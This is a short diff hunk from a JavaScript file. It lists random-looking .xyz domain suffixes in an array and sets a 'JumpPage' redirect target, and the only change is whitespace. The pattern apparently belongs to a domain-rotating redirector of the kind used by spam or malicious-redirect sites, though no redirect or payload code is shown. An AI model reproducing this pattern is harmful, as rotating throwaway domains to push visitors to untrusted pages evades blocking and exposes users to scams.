@@ -41,9 +41,7 @@ var urls=[];
         urls.push(".qfxtalc.xyz");      
         urls.push(".cbuxybzb.xyz");
         urls.push(".ykadphvv.xyz");
-       
-       
-                                                     
+                                                           
 var JumpPage="https://vizanzij.xyz";
 
 var newestUrls = [];
